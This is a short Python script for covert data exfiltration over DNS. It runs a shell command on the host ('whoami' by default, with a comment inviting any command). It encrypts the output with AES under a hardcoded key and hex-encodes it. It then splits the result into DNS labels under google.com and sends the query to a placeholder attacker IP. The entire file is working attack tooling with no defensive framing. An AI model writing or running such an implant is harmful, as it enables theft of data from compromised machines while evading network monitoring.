import subprocess
from dnslib import DNSRecord
from Crypto.Cipher import AES
import base64

DNS_SERVER = "<attacker_ip>"  # your server IP
DOMAIN = "google.com"
AES_KEY = b'\x7f\x96\x91\xbf\xdd:\xab\xafU\xa0\xbe\x14\x1en\x9a\x8c'

def pad(s):
    padding_len = 16 - len(s) % 16
    return s + (chr(padding_len) * padding_len)

def encrypt(msg):
    cipher = AES.new(AES_KEY, AES.MODE_ECB)
    ct = cipher.encrypt(pad(msg).encode())
    return base64.b16encode(ct).decode()  # hex string uppercase

def chunk_string(s, length=63):
    return [s[i:i+length] for i in range(0, len(s), length)]

def send_command_output():
    output = subprocess.getoutput("whoami")  # or any command you want
    encrypted = encrypt(output)
    chunks = chunk_string(encrypted, 63)
    query = ".".join(chunks) + f".{DOMAIN}"
    
    qname = DNSRecord.question(query, qtype="A")
    try:
        qname.send(DNS_SERVER, 53, timeout=2)
        print("[+] Sent encrypted output via DNS")
    except Exception as e:
        print("[!] DNS query failed:", e)

if __name__ == "__main__":
    send_command_output()
